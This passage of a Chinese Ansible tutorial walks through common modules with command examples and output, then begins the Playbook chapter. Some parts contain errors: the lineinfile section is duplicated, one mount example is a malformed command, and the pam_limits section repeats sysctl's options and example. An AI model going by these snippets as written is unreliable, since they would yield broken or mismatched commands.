nginx 至 remote 主机，并校验 md5 值 [root@ansible ~]# ansible remote -m get_url -a \u0026#39;url=http://nginx.org/download/nginx-1.18.0.tar.gz dest=/usr/local/src checksum=\u0026#34;md5:b2d33d24d89b8b1f87ff5d251aa27eb8\u0026#34;\u0026#39; # 下载成功 [root@ansible ~]# ansible remote -a \u0026#39;ls /usr/local/src/\u0026#39; remote | CHANGED | rc=0 \u0026gt;\u0026gt; nginx-1.18.0.tar.gz 2.4.6 fetch 模块 此模块可以将受控节点的文件拉取至 ansible 主控端，和 copy 模块功能相反，目前不支持拉取目录\n常见选项\nsrc # 受控节点源文件路径 dest # ansible 主控端目录路径 范例：\n# 如果同时拉取多台主机的同一文件，ansible 会为每台主机建立单独的文件夹来存放拉取的文件 [root@ansible ~]# ansible all --list-hosts hosts (2): remote remote2 # 将远程主机的redhat-release 文件拉取至 ansible 主机的 /tmp/os目录下（目录会自动创建） [root@ansible ~]# ansible all -m fetch -a \u0026#39;src=/etc/redhat-release dest=/tmp/os/\u0026#39; [root@ansible ~]# tree /tmp/os/ /tmp/os/ ├── remote │ └── etc │ └── redhat-release └── remote2 └── etc └── redhat-release 4 directories, 2 files 2.4.7 file 模块 此模块用于创建，删除文件，目录和软连接以及修改相关属性\n常见选项\npath # 在被控端创建的路径 owner # 属主 group # 属组 mode # 权限 state # 状态 =touch # 创建文件 =directory # 创建目录 =link # 软链接 =hard # 硬链接 recurse # yes 表示递归授权 范例：\n# 创建文件并修改属主 [root@ansible ~]# ansible remote -m file -a \u0026#39;path=/tmp/file.txt state=touch owner=test mode=755\u0026#39; # 删除文件 [root@ansible ~]# ansible remote -m file -a \u0026#39;path=/tmp/file.txt state=absent\u0026#39; # 创建软连接，其中 dest 还可以替换为[ path | name ] [root@ansible ~]# ansible remote -m file -a \u0026#39;src=/etc/redhat-release dest=/tmp/release-link state=link\u0026#39; [root@ansible ~]# ansible remote -a \u0026#39;cat /tmp/release-link\u0026#39; remote | CHANGED | rc=0 \u0026gt;\u0026gt; CentOS Linux release 7.6.1810 (Core) # 创建目录 [root@ansible ~]# ansible remote -m file -a \u0026#39;path=/tmp/dir state=directory\u0026#39; # 递归修改文件属性 [root@ansible ~]# ansible remote -m file -a \u0026#39;path=/tmp owner=test group=test recurse=yes\u0026#39; 2.4.8 stat 模块 此模块用于检查文件或文件系统状态\nansible.builtin.stat module – Retrieve file or file system status — Ansible Documentation\n常见选项\npath # 文件或对象的完整路径（必须） 常见返回值：\nattributes：# 返回指定文件的属性。 executable：# 如果调用的用户在目标路径上有执行权限，则返回 true。 exists：\t# 如果指定的路径存在，返回真。 gr_name：# 返回文件所有者的组的名称。 islbk：\t# 如果指定的文件是一个块状设备，则返回true。 ischr： # 如果指定的文件是一个字符文件，则返回真。 isreg：\t# 如果指定的文件是一个常规文件，则返回真。 isdir：\t# 如果指定的文件是一个目录，则返回真。 islnk：\t# 如果目标文件是一个链接，则返回真。 mode：\t# 以八进制符号返回文件权限。 isuid： # isuid 表示 \u0026#34;is setuid\u0026#34;，用于判断文件是否具有设置用户 ID (Set User ID，SUID) 权限。 范例：\n[root@remote ~]# chmod a+s /etc/centos-release [root@remote ~]# ll /etc/centos-release -rwSr-Sr--. 1 root root 38 Nov 23 2018 /etc/centos-release [root@ansible ~]# ansible remote -m stat -a \u0026#39;path=/etc/centos-release\u0026#39; remote | SUCCESS =\u0026gt; { \u0026#34;ansible_facts\u0026#34;: { \u0026#34;discovered_interpreter_python\u0026#34;: \u0026#34;/usr/bin/python\u0026#34; }, \u0026#34;changed\u0026#34;: false, \u0026#34;stat\u0026#34;: { \u0026#34;atime\u0026#34;: 1687316675.220694, \u0026#34;attr_flags\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;attributes\u0026#34;: [], \u0026#34;block_size\u0026#34;: 4096, \u0026#34;blocks\u0026#34;: 8, \u0026#34;charset\u0026#34;: \u0026#34;us-ascii\u0026#34;, \u0026#34;checksum\u0026#34;: \u0026#34;dd9a53b0d396d3ab190cfbc08dca572d3e741a03\u0026#34;, \u0026#34;ctime\u0026#34;: 1687316666.4736364, \u0026#34;dev\u0026#34;: 64768, \u0026#34;device_type\u0026#34;: 0, \u0026#34;executable\u0026#34;: false, \u0026#34;exists\u0026#34;: true, \u0026#34;gid\u0026#34;: 0, \u0026#34;gr_name\u0026#34;: \u0026#34;root\u0026#34;, \u0026#34;inode\u0026#34;: 67184137, \u0026#34;isblk\u0026#34;: false, \u0026#34;ischr\u0026#34;: false, \u0026#34;isdir\u0026#34;: false, \u0026#34;isfifo\u0026#34;: false, \u0026#34;isgid\u0026#34;: true, \u0026#34;islnk\u0026#34;: false, \u0026#34;isreg\u0026#34;: true, \u0026#34;issock\u0026#34;: false, \u0026#34;isuid\u0026#34;: true, \u0026#34;mimetype\u0026#34;: \u0026#34;text/plain\u0026#34;, \u0026#34;mode\u0026#34;: \u0026#34;6644\u0026#34;, \u0026#34;mtime\u0026#34;: 1542979018.0, \u0026#34;nlink\u0026#34;: 1, \u0026#34;path\u0026#34;: \u0026#34;/etc/centos-release\u0026#34;, \u0026#34;pw_name\u0026#34;: \u0026#34;root\u0026#34;, \u0026#34;readable\u0026#34;: true, \u0026#34;rgrp\u0026#34;: true, \u0026#34;roth\u0026#34;: true, \u0026#34;rusr\u0026#34;: true, \u0026#34;size\u0026#34;: 38, \u0026#34;uid\u0026#34;: 0, \u0026#34;version\u0026#34;: \u0026#34;815093836\u0026#34;, \u0026#34;wgrp\u0026#34;: false, \u0026#34;woth\u0026#34;: false, \u0026#34;writeable\u0026#34;: true, \u0026#34;wusr\u0026#34;: true, \u0026#34;xgrp\u0026#34;: false, \u0026#34;xoth\u0026#34;: false, \u0026#34;xusr\u0026#34;: false } } 2.4.9 unarchive 模块 此模块用于解包和解压缩，有两种用法：\n将 ansible 主机上的压缩文件解压至受控节点的指定路径下 将非 ansible 的其他主机的压缩文件解压到受控节点的指定路径下 常见参数：\nremote_src # yes 表示源文件在远程被控主机或非 ansible 的其它主机上，no 表示文件在ansible主机上, 默认值为 no, 此选项代替copy选项（已废弃） src #源路径，可以是 ansible 主机上的路径，也可以是远程主机(被管理端或者第三方主机)上的路径，如果是远程主机上的路径，则需要设置 remote_src=yes dest # 远程主机上的目标路径 mode # 设置解压缩后的文件权限 creates=PATH # 当PATH不存在时才会执行 范例：\n# 解压本地文件到受控节点的指定目录（目标目录不存在会报错，不会自动创建） [root@ansible ~]# ansible remote -m unarchive -a \u0026#39;src=/tmp/test.tar.gz dest=/tmp/\u0026#39; # 解压其他主机的压缩包到受控节点 [root@ansible ~]# ansible remote -m unarchive -a \u0026#39;src=https://releases.ansible.com/ansible/ansible-2.1.6.0-0.1.rc1.tar.gz dest=/tmp remote_src=yes\u0026#39; 2.4.10 archive 模块 此模块用于在受控节点打包压缩文件\n常见选项\npath # 压缩的文件或目录 dest # 压缩后的文件 format # 压缩格式,支持gz,bz2,xz,tar,zip 范例：\n[root@ansible tmp]# ansible remote -m archive -a \u0026#39;path=/etc/redhat-release dest=/tmp/log.tar.gz format=gz\u0026#39; 2.4.11 hostname 模块 此模块用于修改主机名\n常见选项\nname # 要修改的目标主机名 范例：\n[root@ansible ~]# ansible remote -m hostname -a \u0026#39;name=test\u0026#39; 2.4.12 cron 模块 此模块用于创建计划任务\n常见选项\nname # 任务名称，可以根据此名称删除对应的计划任务 minute # 分钟 hour # 小时 weekday # 周 user\t# 任务由哪个用户运行；默认root job # 任务 范例：\n# 创建一个计划任务，命名为 test [root@ansible ~]# ansible remote -m cron -a \u0026#39;minute=0 hour=2 weekday=1-5 job=\u0026#34;echo test\u0026#34; name=hello\u0026#39; # 查看创建结果 [root@ansible ~]# ansible remote -a \u0026#39;crontab -l\u0026#39; remote | CHANGED | rc=0 \u0026gt;\u0026gt; #Ansible: hello 0 2 * * 1-5 echo test 2.4.13 yum 和 apt 模块 此模块用于管理软件包\nyum：适用于RHEL，CentoOS，Fedora 等系统 apt：适用于Debian，Ubuntu 等系统 yum 模块常见选项\nname # 软件包名称 state # 状态 =present # 安装, 此为默认值 =absent # 删除 =latest # 最新版 list # 列出指定包 enablerepo # 启用仓库xx disablerepo # 禁用仓库xx exclude # 排除指定的包 validate # 是否检验, 默认为 yes 范例：\n# 安装 httpd ansible remote -m yum -a \u0026#39;name=httpd state=present\u0026#39; # 删除 httpd ansible remote -m yum -a \u0026#39;name=httpd state=absent\u0026#39; # 从网络源安装 zabbix （由于缺少其他依赖包，该命令可能执行失败） ansible remote -m yum -a \u0026#39;name=https://mirrors.tuna.tsinghua.edu.cn/zabbix/zabbix/5.0/rhel/8/x86_64/zabbix-agent2-5.0.24-1.el8.x86_64.rpm state=present validate_certs=no\u0026#39; # 启用 epel 源安装 nginx ansible remote -m yum -a \u0026#39;name=nginx state=present enablerepo=epel\u0026#39; # 明确禁用 epel 源会导致安装失败（找不到 nginx 包） ansible remote -m yum -a \u0026#39;name=nginx state=present disablerepo=epel\u0026#39; # 安装除了 kernel* 和 foo* 匹配到的其余所有包（测试使用，谨慎执行） ansible remote -m yum -a \u0026#39;name=* state=latest exclude=kerner*,foo*\u0026#39; # 列出所有版本的包 ansible remote -m yum -a \u0026#39;list=tree\u0026#39; 2.4.14 yum_repository 此模块用于 yum 仓库的配置管理\n常见选项\nname # 仓库id，也是配置文件名 description # 仓库描述名称,对应配置文件中的name= baseurl # 仓库的地址 gpgcheck # 开启密钥验证 gpgkey # 仓库公钥路径 范例：\n# 添加 nginx 仓库 [root@ansible ~]# ansible remote -m yum_repository -a \u0026#39;name=nginx-repo description=\u0026#34;nginx repo\u0026#34; baseurl=\u0026#34;http://nginx.org/packages/centos/$releasever/$basearch/\u0026#34; gpgcheck=yes gpgkey=\u0026#34;https://nginx.org/keys/nginx_signing.key\u0026#34;\u0026#39; # 查看添加结果 [root@ansible ~]# ansible remote -a \u0026#39;cat /etc/yum.repos.d/nginx-repo.repo\u0026#39; remote | CHANGED | rc=0 \u0026gt;\u0026gt; [nginx-repo] baseurl = http://nginx.org/packages/centos/$releasever/$basearch/ gpgcheck = 1 gpgkey = https://nginx.org/keys/nginx_signing.key name = nginx repo # 删除 nginx 仓库 [root@ansible ~]# ansible remote -m yum_repository -a \u0026#39;name=nginx-repo state=absent\u0026#39; 2.4.15 service 模块 此模块和 systemd 的功能类似，用于管理系统服务\n常见选项\nname # 服务名称 state # 服务状态 =started # 启动 =stopped # 停止 =restarted # 重启 =reloaded # 重载 enabled # 开启自启动 daemon_reload # 加载新的配置文件,适用于systemd模块 范例：\n# 启动并设置 httpd 服务开机自启动 ansible remote -m service -a \u0026#39;name=httpd state=started enabled=yes\u0026#39; # 关闭 httpd 服务，并关闭开机自启 ansible remote -m service -a \u0026#39;name=httpd state=stopped enabled=no\u0026#39; # 重启指定网卡服务 ansible remote -m service -a \u0026#39;name=network state=restarted args=ens33\u0026#39; 2.4.16 user 模块 此模块用于用户管理\n常用选项\nname # 创建的名称 uid # 指定 uid group # 指定基本组 shell # 登录 shell 类型默认 /bin/bash create_home # 是否创建家目录 password # 设定对应的密码，必须是加密后的字符串才行，否则不生效 system # yes 表示系统用户 groups # 附加组 append # 追加附加组使用, yes 表示增加新的附加组 state # absent 删除 remove # yes 表示删除用户时将家目录一起删除 generate_ssh_key # 创建私钥 ssh_keyu_bits # 私钥位数 ssh_key_file # 私钥文件路径 范例：\n# 创建用户并指定相关属性（家目录会自动创建） ansible remote -m user -a \u0026#39;name=test uid=1001 home=/app/test shell=/bin/sh\u0026#39; # 创建系统用户（uid \u0026lt; 1000） ansible remote -m user -a \u0026#39;name=test1 home=/app/test1 shell=/bin/bash system=yes\u0026#39; # 利用 debug 模块生成加密密码 [root@ansible ~]# ansible localhost -m debug -a \u0026#39;msg={{ \u0026#34;123456\u0026#34; | password_hash(\u0026#34;sha512\u0026#34;,\u0026#34;salt\u0026#34;) }}\u0026#39; localhost | SUCCESS =\u0026gt; { \u0026#34;msg\u0026#34;: \u0026#34;$6$salt$MktMKPZJ6t59GfxcJU20DwcwQzfMvOlHFVZiOVD71w.igcOo1R7vBYR65JquIQ/7siC7VRpmteKvZmfSkNc69.\u0026#34; } # 创建用户并指定密码（如果直接指定明文密码，执行虽然成功，但是登录时会报密码错误） ansible remote -m user -a \u0026#39;name=test2 shell=/bin/bash password=$6$salt$MktMKPZJ6t59GfxcJU20DwcwQzfMvOlHFVZiOVD71w.igcOo1R7vBYR65JquIQ/7siC7VRpmteKvZmfSkNc69.\u0026#39; # 创建用户并生成 2048 bit 的用户私钥 ansible remote -m user -a \u0026#39;name=test3 generate_ssh_key=yes ssh_key_bits=2048 ssh_key_file=.ssh/id_rsa\u0026#39; 2.4.17 group 模块 此模块用于管理用户组\n常见选项\nname # 指定组名称 gid # 指定gid state =present # 创建, 默认 =absent # 删除 范例：\n# 创建系统用户组 ansible remote -m group -a \u0026#39;name=test system=yes\u0026#39; # 删除组 ansible remote -m group -a \u0026#39;name=test state=absent\u0026#39; 2.4.18 lineinfile 模块\n此模块相当于 sed ，用于对文本进行单行替换。之所以不用 sed ，是因为 ansible 对特殊符号的支持不强，实际操作时可能无法替换，且需要对符号进行转义，比较麻烦。\n常见选项\npath # 被控端文件的路径 regexp # 正则匹配字符串 line # 替换的目标内容 state # absent 表示删除 insertafter # 插入到匹配行前 insertbefore # 插入到匹配行后 backrefs # 是否支持后向引用 backup # 修改前先备份 create # 如果文件不存在, 则创建, 默认不存在会出错 mode # 指定权限 owner # 指定用户 group # 指定组 # 注意 # regexp参数：使用正则表达式匹配对应的行，当替换文本时，如果匹配到了多行，只有最后一个匹配行会被替换。当删除文本时，所有匹配到的行都会被删除。 范例：\n# 修改 httpd 服务的监听端口 ansible remote -m lineinfile -a \u0026#39;path=/etc/httpd/conf/httpd.conf regexp=\u0026#34;^Listen\u0026#34; line=\u0026#34;Listen 8080\u0026#34;\u0026#39; # 禁用 selinux ansible remote -m lineinfile -a \u0026#39;path=/etc/selinux/config regexp=\u0026#34;^SELINUX=\u0026#34; line=\u0026#34;SELINUX=disabled\u0026#34;\u0026#39; # 添加网关 ansible remote -m lineinfile -a \u0026#39;path=/etc/sysconfig/network-scripts/ifcfg-ens33 line=\u0026#34;GATEWAY=10.0.0.254\u0026#34;\u0026#39; # 在最后一行添加网关配置 ansible remote -m lineinfile -a \u0026#39;path=/etc/sysconfig/network-scripts/ifcfg-ens33 line=\u0026#34;GATEWAY=10.0.0.254\u0026#34;\u0026#39; # 验证添加结果 [root@ansible ~]# ansible remote -a \u0026#39;tail -n1 /etc/sysconfig/network-scripts/ifcfg-ens33\u0026#39; remote | CHANGED | rc=0 \u0026gt;\u0026gt; GATEWAY=10.0.0.254 # 删除添加的网关配置 ansible remote -m lineinfile -a \u0026#39;path=/etc/sysconfig/network-scripts/ifcfg-ens33 line=\u0026#34;GATEWAY=10.0.0.254\u0026#34; state=absent\u0026#39; # 添加一个网关，在 \u0026#34;NAME=\u0026#34; 该行前添加 ansible remote -m lineinfile -a \u0026#39;path=/etc/sysconfig/network-scripts/ifcfg-ens33 line=\u0026#34;GATEWAY=10.0.0.254\u0026#34; insertbefore=\u0026#34;^NAME=\u0026#34;\u0026#39; # 查看添加结果 [root@ansible ~]# ansible remote -a \u0026#39;grep -i gateway /etc/sysconfig/network-scripts/ifcfg-ens33 -A 1\u0026#39; remote | CHANGED | rc=0 \u0026gt;\u0026gt; GATEWAY=10.0.0.254 NAME=\u0026#34;ens33\u0026#34; 2.4.18 lineinfile 模块 此模块主要用于基于正则的单行文本匹配和替换\nansible 对特殊符号的支持不是很好，如果用 sed 进行复杂字符替换很可能出现问题，因此在进行文本替换时，最好用该模块而非sed\n常见选项\npath #被控端文件的路径 regexp #正则匹配语法格式,表示被替换的内容 line #替换为的内容 state #absent表示删除 insertafter #插入匹配行后 insertbefore #插入匹配行前 backrefs #支持后向引用, yes 和 no backup #修改前先备份 create #如果文件不存在, 则创建, 默认不存在会出错 mode #指定权限 owner #指定用户 group #指定组 #注意 regexp 参数：使用正则表达式匹配对应的行，有两种处理方式 当替换文本时，如果有多个匹配行，则只会对最后一行进行替换 当删除文本时，如果有多行文本都能被匹配，这么这些行都会被删除。 范例：\n# 关闭 selinux ansible remote -m lineinfile -a \u0026#34;path=/etc/selinux/config regexp=\u0026#39;^SELINUX=\u0026#39; line=\u0026#39;SELINUX=disabled\u0026#39;\u0026#34; # 添加 DNS 配置（最后一行） ansible remote -m lineinfile -a \u0026#39;path=/etc/sysconfig/network-scripts/ifcfg-ens33 line=\u0026#34;DNS1=8.8.8.8\u0026#34;\u0026#39; # 添加 DNS 配置（匹配行下添加） ansible remote -m lineinfile -a \u0026#39;path=/etc/sysconfig/network-scripts/ifcfg-ens33 insertafter=\u0026#34;^NAME\u0026#34; line=\u0026#34;DNS1=8.8.8.8\u0026#34;\u0026#39; # 删除一行 ansible remote -m lineinfile -a \u0026#39;path=/etc/sysconfig/network-scripts/ifcfg-ens33 line=\u0026#34;DNS1=8.8.8.8\u0026#34; state=\u0026#34;absent\u0026#34;\u0026#39; # 删除注释行 ansible remote -m lineinfile -a \u0026#39;dest=/etc/fstab state=absent regexp=\u0026#34;^#\u0026#34;\u0026#39; ### 多行相同文本，只替换最后一行 [root@ansible ~]# ansible remote -a \u0026#39;cat /root/test.txt\u0026#39; remote | CHANGED | rc=0 \u0026gt;\u0026gt; a a a [root@ansible ~]# ansible remote -m lineinfile -a \u0026#34;path=/root/test.txt regexp=\u0026#39;a\u0026#39; line=\u0026#39;b\u0026#39;\u0026#34; remote | CHANGED =\u0026gt; { \u0026#34;ansible_facts\u0026#34;: { \u0026#34;discovered_interpreter_python\u0026#34;: \u0026#34;/usr/bin/python\u0026#34; }, \u0026#34;backup\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;changed\u0026#34;: true, \u0026#34;msg\u0026#34;: \u0026#34;line replaced\u0026#34; } [root@ansible ~]# ansible remote -a \u0026#39;cat /root/test.txt\u0026#39; remote | CHANGED | rc=0 \u0026gt;\u0026gt; a a b 2.4.19 replace 模块 该模块与 sed 类似，主要用于基于正则的多行文本匹配和替换\n常见选项\npath # 被控端文件的路径 regexp # 正则匹配语法格式 replace # 目标替换内容 after # 插入匹配行后 before # 插入匹配行前 backup # 修改前先备份 mode # 指定权限 owner # 指定用户 group # 指定组 范例：\nansible remote -m replace -a \u0026#34;path=/etc/fstab regexp=\u0026#39;^(UUID.*)\u0026#39; replace=\u0026#39;#\\1\u0026#39;\u0026#34; ansible remote -m replace -a \u0026#34;path=/etc/fstab regexp=\u0026#39;^#(UUID.*)\u0026#39; replace=\u0026#39;\\1\u0026#39;\u0026#34; ### 多行匹配替换 [root@ansible ~]# ansible remote -a \u0026#39;cat /root/test.txt\u0026#39; remote | CHANGED | rc=0 \u0026gt;\u0026gt; b b b [root@ansible ~]# ansible remote -m replace -a \u0026#34;path=/root/test.txt regexp=\u0026#39;b\u0026#39; replace=\u0026#39;a\u0026#39;\u0026#34; remote | CHANGED =\u0026gt; { \u0026#34;ansible_facts\u0026#34;: { \u0026#34;discovered_interpreter_python\u0026#34;: \u0026#34;/usr/bin/python\u0026#34; }, \u0026#34;changed\u0026#34;: true, \u0026#34;msg\u0026#34;: \u0026#34;2 replacements made\u0026#34; } [root@ansible ~]# ansible remote -a \u0026#39;cat /root/test.txt\u0026#39; remote | CHANGED | rc=0 \u0026gt;\u0026gt; a a a 2.4.20 selinux 模块 该模块用来管理 selinux 策略。根据国内使用习惯，这里主要演示如何关闭 selinux\n常见选项\npolicy # 指定SELINUXTYPE=targeted state # 指定SELINUX=disabled 范例：\n[root@ansible ~]# ansible remote -m selinux -a \u0026#39;state=disabled\u0026#39; [WARNING]: SELinux state temporarily changed from \u0026#39;enforcing\u0026#39; to \u0026#39;permissive\u0026#39;. State change will take effect next reboot. remote | CHANGED =\u0026gt; { \u0026#34;ansible_facts\u0026#34;: { \u0026#34;discovered_interpreter_python\u0026#34;: \u0026#34;/usr/bin/python\u0026#34; }, \u0026#34;changed\u0026#34;: true, \u0026#34;configfile\u0026#34;: \u0026#34;/etc/selinux/config\u0026#34;, \u0026#34;msg\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;policy\u0026#34;: \u0026#34;targeted\u0026#34;, \u0026#34;reboot_required\u0026#34;: true, \u0026#34;state\u0026#34;: \u0026#34;disabled\u0026#34; } [root@ansible ~]# ansible remote -a \u0026#34;grep -v \u0026#39;#\u0026#39; /etc/selinux/config\u0026#34; remote | CHANGED | rc=0 \u0026gt;\u0026gt; SELINUX=disabled SELINUXTYPE=targeted [root@ansible ~]# ansible remote -a \u0026#34;getenforce\u0026#34; remote | CHANGED | rc=0 \u0026gt;\u0026gt; Permissive 2.4.21 reboot 模块 用于重启目标机器\n常见选项\nmsg # 重启提示内容 pre_reboot_delay # 重启前的延迟时间，单位：s post_reboot_delay # 重启后经过多少时间再验证系统功能是否正常，单位：s reboot_timeout #重启后延迟时间再执行测试成功与否的命令 test_command #执行测试成功与否的命令 范例：重启系统，会阻塞等待重启完成才会返回执行结果\n[root@ansible ~]# ansible remote -m reboot -a \u0026#34;msg=\u0026#39;host will be reboot\u0026#39;\u0026#34; remote | CHANGED =\u0026gt; { \u0026#34;changed\u0026#34;: true, \u0026#34;elapsed\u0026#34;: 17, \u0026#34;rebooted\u0026#34;: true } 2.4.22 mount 模块 用于文件系统的管理\n常见选项\nsrc #源设备路径，或网络地址 path #挂载至本地哪个路径下 fstype #设备类型 opts #挂载的选项 state #挂载还是卸载 =present #永久挂载，但没有立即生效 =absent #卸载临时挂载,并删除永久挂载 =mounted #临时挂载 =unmounted #临时卸载 范例：\n# 永久卸载 [root@ansible ~]# ansible remote -m mount -a \u0026#39;src=/dev/sdb path=/app state=absent\u0026#39; # 永久挂载，不会立即生效，仅修改/etc/fstab 文件 [root@ansible ~]# ansible remote -m mount -a \u0026#39;src=/dev/sdb path=/app state=absent\u0026#39; fstype=xfs opts=noatime path=swap state=present\u0026#39; # 临时挂载 [root@ansible ~]# ansible remote -m mount -a \u0026#39;src=/dev/sdb path=/app fstype=xfs opts=default state=mounted\u0026#39; # 临时卸载 [root@ansible ~]# ansible remote -m mount -a \u0026#39;src=/dev/sdb path=/app fstype=xfs opts=default state=unmounted\u0026#39; opts=noatime：opts是传递给mount命令的额外选项，这里使用的是noatime，表示在读取文件时，不更新文件的最后访问时间。这可以提高文件系统的性能。默认是 default\n2.4.23 setup 模块 该模块用于收集目标主机的系统信息，在使用 ansible 时，是默认启用的。该模块收集到的信息可以通过变量引用，但是通常情况下，它会影响执行速度。如果不需要，可以显式关闭以提高执行效率。\n可以使用 gather_facts: no 来禁止 Ansible 收集 facts 信息\n常见选项\nfilter # 指定过滤条件 范例：\nansible remote -m setup ansible remote -m setup -a \u0026#34;filter=ansible_nodename\u0026#34; ansible remote -m setup -a \u0026#34;filter=ansible_hostname\u0026#34; ansible remote -m setup -a \u0026#34;filter=ansible_domain\u0026#34; ansible remote -m setup -a \u0026#34;filter=ansible_memtotal_mb\u0026#34; ansible remote -m setup -a \u0026#34;filter=ansible_memory_mb\u0026#34; ansible remote -m setup -a \u0026#34;filter=ansible_memfree_mb\u0026#34; ansible remote -m setup -a \u0026#34;filter=ansible_os_family\u0026#34; ansible remote -m setup -a \u0026#34;filter=ansible_distribution\u0026#34; ansible remote -m setup -a \u0026#34;filter=ansible_distribution_major_version\u0026#34; ansible remote -m setup -a \u0026#34;filter=ansible_distribution_version\u0026#34; ansible remote -m setup -a \u0026#34;filter=ansible_processor_vcpus\u0026#34; ansible remote -m setup -a \u0026#34;filter=ansible_remote_ipv4_addresses\u0026#34; ansible remote -m setup -a \u0026#34;filter=ansible_architecture\u0026#34; ansible remote -m setup -a \u0026#34;filter=ansible_uptime_seconds\u0026#34; ansible remote -m setup -a \u0026#34;filter=ansible_processor*\u0026#34; ansible remote -m setup -a \u0026#39;filter=ansible_env\u0026#39; 2.4.24 debug 模块 此模块用于打印相关信息，类似于 print 和 echo\n常见选项\nmsg\t# 打印内容 var\t# 设置变量并赋值 verbosity # 详细级别 范例：未指定msg，默认打印 hello world\n[root@ansible ~]# ansible remote -m debug remote | SUCCESS =\u0026gt; { \u0026#34;msg\u0026#34;: \u0026#34;Hello world!\u0026#34; } 范例：打印变量值\n[root@ansible playbooks]# cat debug.yaml --- - hosts: remote gather_facts: yes tasks: - name: print value of variable debug: msg: host \u0026#34;{{ ansible_nodename }}\u0026#34; [root@ansible playbooks]# ansible-playbook debug.yaml PLAY [remote] *************************************************************************************** TASK [Gathering Facts] ****************************************************************************** ok: [remote] TASK [print value of variable] ********************************************************************** ok: [remote] =\u0026gt; { \u0026#34;msg\u0026#34;: \u0026#34;host \\\u0026#34;remote\\\u0026#34;\u0026#34; } PLAY RECAP ****************************************************************************************** remote : ok=2 changed=0 unreachable=0 failed=0 skipped=0 rescued=0 ignored=0 范例：通过下标打印指定对应字符\n[root@ansible playbooks]# cat debug.yaml --- - hosts: remote gather_facts: no vars: str: \u0026#34;01234\u0026#34; tasks: - debug: msg: - \u0026#34;{{ str[0] }}\u0026#34; - \u0026#34;{{ str[1] }}\u0026#34; - \u0026#34;{{ str[2] }}\u0026#34; [root@ansible playbooks]# ansible-playbook debug.yaml PLAY [remote] *************************************************************************************** TASK [debug] **************************************************************************************** ok: [remote] =\u0026gt; { \u0026#34;msg\u0026#34;: [ \u0026#34;0\u0026#34;, \u0026#34;1\u0026#34;, \u0026#34;2\u0026#34; ] } PLAY RECAP ****************************************************************************************** remote : ok=1 changed=0 unreachable=0 failed=0 skipped=0 rescued=0 ignored=0 2.4.25 sysctl 模块 此模块用于修改内核参数\n常见选项\nname # 内核参数名 value # 指定值 state # 是否保存在sysctl.conf文件中，默认present sysctl_set #使用sysctl -w 验证值生效 范例：\n[root@ansible playbooks]# ansible remote -m sysctl -a \u0026#39;name=net.ipv4.ip_forward value=1 state=present\u0026#39; remote | CHANGED =\u0026gt; { \u0026#34;ansible_facts\u0026#34;: { \u0026#34;discovered_interpreter_python\u0026#34;: \u0026#34;/usr/bin/python\u0026#34; }, \u0026#34;changed\u0026#34;: true } [root@ansible playbooks]# ansible remote -a \u0026#39;grep forward /etc/sysctl.conf\u0026#39; remote | CHANGED | rc=0 \u0026gt;\u0026gt; net.ipv4.ip_forward=1 其他示例：\n--- - hosts: remote gather_facts: no tasks: - name: Change Port Range sysctl: name: net.ipv4.ip_local_port_range value: \u0026#39;1024 65000\u0026#39; sysctl_set: yes - name: Enabled Forward sysctl: name: net.ipv4.ip_forward value: \u0026#39;1\u0026#39; sysctl_set: yes - name: Enabled tcp_reuse sysctl: name: net.ipv4.tcp_tw_reuse value: \u0026#39;1\u0026#39; sysctl_set: yes - name: Chanage tcp tw_buckets sysctl: name: net.ipv4.tcp_max_tw_buckets value: \u0026#39;5000\u0026#39; sysctl_set: yes - name: Chanage tcp_syncookies sysctl: name: net.ipv4.tcp_syncookies value: \u0026#39;1\u0026#39; sysctl_set: yes - name: Chanage tcp max_syn_backlog sysctl: name: net.ipv4.tcp_max_syn_backlog value: \u0026#39;8192\u0026#39; sysctl_set: yes - name: Chanage tcp Established Maxconn sysctl: name: net.core.somaxconn value: \u0026#39;32768\u0026#39; sysctl_set: yes state: present - name: Chanage tcp_syn_retries sysctl: name: net.ipv4.tcp_syn_retries value: \u0026#39;2\u0026#39; sysctl_set: yes state: present - name: Chanage net.ipv4.tcp_synack_retries sysctl: name: net.ipv4.tcp_synack_retries value: \u0026#39;2\u0026#39; sysctl_set: yes state: present 2.4.26 pam_limits 模块 此模块用于修改内核资源限制\n常见选项\nname\t# 内核参数 value\t# 指定值 state\t# 是否保存在 sysctl.conf 文件中，默认保存 sysctl_set # 使 sysctl -w 验证值生效 范例：\nansible remote -m sysctl -a \u0026#39;name=net.ipv4.ip_forward value=1 state=present\u0026#39; 范例内核参数优化：\n--- - hosts: remote gather_facts: no vars: limits_conf_dest: \u0026#39;/etc/security/limits.conf\u0026#39; tasks: - name: Modify {{ limits_conf_dest }} pam_limits: dest: \u0026#34;{{ limits_conf_dest }}\u0026#34; domain: \u0026#39;*\u0026#39; limit_type: \u0026#34;{{ item.limit_type }}\u0026#34; limit_item: \u0026#34;{{ item.limit_item }}\u0026#34; value: \u0026#34;{{ item.value }}\u0026#34; loop: - { limit_type: \u0026#39;soft\u0026#39;, limit_item: \u0026#39;nofile\u0026#39;, value: \u0026#39;655350\u0026#39; } - { limit_type: \u0026#39;hard\u0026#39;, limit_item: \u0026#39;nofile\u0026#39;, value: \u0026#39;655350\u0026#39; } - { limit_type: \u0026#39;soft\u0026#39;, limit_item: \u0026#39;nproc\u0026#39;, value: \u0026#39;655350\u0026#39; } - { limit_type: \u0026#39;hard\u0026#39;, limit_item: \u0026#39;nproc\u0026#39;, value: \u0026#39;655350\u0026#39; } 3 Ansible Playbook 3.1 Playbook 简介 官网：Ansible playbooks — Ansible Documentation\nPlaybook 是 Ansible 中用于定义自动化任务的文本文件。它是一种声明性的描述方式，用于指定一系列步骤和配置，以便 Ansible 可以在远程主机上执行这些步骤。Playbook 可以用于配置服务器、部署应用程序、管理系统等一系列自动化任务。\n以下是 Playbook 的一些重要特点和组成部分：\n声明性描述: Playbook 采用声明性的方式描述了你要执行的任务，而不需要详细说明每个步骤的执行过程。\nYAML 格式: Playbook 是用 YAML（Yet Another Markup Language）格式编写的。YAML 格式具有良好的可读性，使得 Playbook 更易于理解和编写。\n主机清单: 在 Playbook 中，你可以指定要执行任务的目标主机。这通常通过清单文件来实现，清单文件列出了要执行任务的远程主机。\n任务: Playbook 由一个或多个任务组成，每个任务描述了一个特定的操作，如运行命令、复制文件、安装软件等。\n模块: 任务使用模块来执行实际的操作。模块是 Ansible 